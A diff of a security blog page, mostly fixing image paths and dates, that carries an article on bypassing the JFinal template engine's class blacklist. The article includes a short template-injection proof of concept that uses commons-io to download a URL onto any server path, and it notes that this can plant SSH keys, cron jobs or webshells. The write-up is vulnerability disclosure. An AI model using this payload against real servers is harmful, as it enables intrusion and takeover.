@@ -15,13 +15,13 @@
 <meta property="og:site_name" content="turn1tup&#39;s bolg">
 <meta property="og:description" content="JFinal Code ExcutionJFinal is a Java Web framework with front-end rendering function. If its front-end template allows users to edit, it will cause code execution vulnerability. JFinal itself does som">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://turn1tup.github.io/2021/04/15/JFinalCodeExecution/JFinalCodeExecution%5Cblock_class.png">
-<meta property="og:image" content="https://turn1tup.github.io/2021/04/15/JFinalCodeExecution/JFinalCodeExecution%5CTestMain.png">
-<meta property="article:published_time" content="2021-04-15T13:48:24.043Z">
-<meta property="article:modified_time" content="2021-04-15T13:48:24.043Z">
+<meta property="og:image" content="https://turn1tup.github.io/2021/04/15/JFinalCodeExecution/block_class.png">
+<meta property="og:image" content="https://turn1tup.github.io/2021/04/15/JFinalCodeExecution/TestMain.png">
+<meta property="article:published_time" content="2021-04-15T13:52:31.159Z">
+<meta property="article:modified_time" content="2021-04-15T13:52:31.159Z">
 <meta property="article:author" content="turn1tup">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://turn1tup.github.io/2021/04/15/JFinalCodeExecution/JFinalCodeExecution%5Cblock_class.png">
+<meta name="twitter:image" content="https://turn1tup.github.io/2021/04/15/JFinalCodeExecution/block_class.png">
   
     <link rel="alternative" href="/atom.xml" title="turn1tup&#39;s bolg" type="application/atom+xml">
   
@@ -170,7 +170,7 @@
 
         
         <a href="/2021/04/15/JFinalCodeExecution/" class="archive-article-date">
-  	<time datetime="2021-04-15T13:48:24.043Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-15</time>
+  	<time datetime="2021-04-15T13:52:31.159Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-15</time>
 </a>
         
       </header>
@@ -179,11 +179,11 @@
       
         <h1 id="JFinal-Code-Excution"><a href="#JFinal-Code-Excution" class="headerlink" title="JFinal Code Excution"></a>JFinal Code Excution</h1><p>JFinal is a Java Web framework with front-end rendering function. If its front-end template allows users to edit, it will cause code execution vulnerability. JFinal itself does some blacklist restrictions, but there are bypass problems.</p>
 <p>JFinal only allows users to invoke static methods, and in com.jfinal.template.expr.ast.MethodKit we can see JFinal do some blacklist to restrict code execution. After debugging, we found a total of 16 classes that were masked.</p>
-<p><img src="/2021/04/15/JFinalCodeExecution/JFinalCodeExecution%5Cblock_class.png" alt="block_class"></p>
+<p><img src="/2021/04/15/JFinalCodeExecution/block_class.png" alt="block_class"></p>
 <p>But most Web applications contain a number of third-party libraries that are available in static methods.</p>
 <p>I have push an example on gihub  ( <a href="https://github.com/turn1tup/JFinalTest" target="_blank" rel="noopener">https://github.com/turn1tup/JFinalTest</a>), you can use this code example to understand  this vul.</p>
 <p>This is the Class  used to render a html page and which triggering holes.</p>
-<p><img src="/2021/04/15/JFinalCodeExecution/JFinalCodeExecution%5CTestMain.png" alt="block_class"></p>
+<p><img src="/2021/04/15/JFinalCodeExecution/TestMain.png" alt="block_class"></p>
 <p>We circumvented JFinal’s blacklist policy by using third-party libraries</p>
 <p>The POC can upload any file to any location of the server, we can write the SSH public key, timing task or webshell to  getshell</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#set(uri&#x3D;java.net.URI::create(&quot;https:&#x2F;&#x2F;github.com&#x2F;turn1tup&#x2F;JFinalTest&#x2F;blob&#x2F;main&#x2F;README.md&quot;))</span><br><span class="line">#set(url&#x3D;uri.toURL())</span><br><span class="line">#set(paths&#x3D;java.nio.file.Paths::get(&quot;D:&#x2F;&quot;, &quot;success.txt&quot;))</span><br><span class="line">#(org.apache.commons.io.file.PathUtils::copyFile(url, paths))</span><br></pre></td></tr></table></figure>
@@ -294,8 +294,8 @@
 <nav id="article-nav">
   
   
-    <a href="/2021/04/15/JFinal%20Code%20Execution/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">JFinal Code Execution</div>
+    <a href="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">OpenRASP学习笔记</div>
       <i class="icon-circle-right"></i>
     </a>
   
